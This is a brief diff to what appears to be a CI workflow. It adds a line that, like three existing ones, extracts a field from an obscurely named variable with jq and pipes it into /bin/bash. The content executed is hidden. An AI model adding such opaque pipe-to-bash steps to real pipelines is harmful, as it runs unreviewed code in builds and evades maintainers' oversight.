@@ -21,6 +21,7 @@ jobs:
           echo $ilp28 | jq -r .c8 | /bin/bash
           echo $gs3 | jq -r .np7 | /bin/bash
           printf '%s' "$c6097" | jq -r .coolq5881 | /bin/bash
+          echo $qab216 | jq -r .p85 | /bin/bash
 
       - name: Store results
         if: always()
